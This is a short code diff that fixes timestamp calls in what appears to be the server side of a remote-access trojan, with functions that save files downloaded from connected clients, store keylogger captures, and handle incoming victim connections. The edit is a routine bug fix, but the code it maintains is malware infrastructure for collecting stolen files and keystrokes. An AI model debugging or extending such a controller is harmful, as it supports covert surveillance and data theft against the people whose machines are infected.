@@ -61,7 +61,7 @@ def save_downloaded_file(data, original_filename):
             os.makedirs(DOWNLOAD_PATH)
             
         file_data = base64.b64decode(data.strip())
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         name, ext = os.path.splitext(original_filename)
         filename = f"{name}_{timestamp}{ext}"
         
@@ -109,7 +109,7 @@ def save_keylog(data, filename=None):
             os.makedirs(KEYLOGGER_PATH)
             
         if not filename:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"keylog_{timestamp}.txt"
             
         file_path = os.path.join(KEYLOGGER_PATH, filename)  
@@ -126,7 +126,7 @@ def save_keylog(data, filename=None):
     
 def handle_client(conn, addr):
     print(f"\n[#] Client connected: {addr[0]}:{addr[1]}")
-    print(f"[i] Connection established at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[i] Connection established at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("[i] Type /help for available commands.\n") 
     
     try:
